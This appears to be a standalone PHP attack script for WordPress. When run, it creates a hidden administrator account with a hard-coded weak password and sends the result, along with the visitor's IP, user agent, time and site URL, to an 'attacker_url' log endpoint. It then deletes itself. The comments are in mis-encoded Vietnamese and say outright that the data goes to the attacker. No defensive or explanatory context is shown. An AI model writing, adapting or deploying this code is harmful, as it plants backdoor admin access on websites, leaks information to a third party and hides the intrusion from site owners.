<?php
// Load WordPress core
require_once('wp-load.php');

// Define new admin credentials
$new_user  = 'admin10';
$new_pass  = 'admin10';
$new_email = 'admin10@example.com';
$attacker_url = 'http://192.168.85.128:8000/log.php';

// Buffer output
ob_start();

if (!username_exists($new_user) && !email_exists($new_email)) {
    $user_id = wp_create_user($new_user, $new_pass, $new_email);

    $user = new WP_User($user_id);
    $user->set_role('administrator');

    echo "âœ… Admin user '{$new_user}' created.<br>";
} else {
    echo "âš ï¸ Account '{$new_user}' already exists.<br>";
}

$result = ob_get_clean();

// ğŸ“¡ Thu tháº­p thÃªm thÃ´ng tin há»‡ thá»‘ng
$ip    = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time  = date('Y-m-d H:i:s');
$site  = site_url();

// ğŸ“¤ Gá»­i thÃ´ng tin vá» attacker
$log_data = http_build_query([
    'result' => $result,
    'ip'     => $ip,
    'agent'  => $agent,
    'time'   => $time,
    'site'   => $site
]);

@file_get_contents("{$attacker_url}?{$log_data}");

// âœ… Hiá»ƒn thá»‹ ná»™i dung chÃ­nh cho trÃ¬nh duyá»‡t
echo $result;

// ğŸ§¹ Tá»± xÃ³a script
$self = __FILE__;
if (unlink($self)) {
    echo "ğŸ§¹ Script deleted itself.";
} else {
    echo "âŒ Failed to delete script.";
}
?>
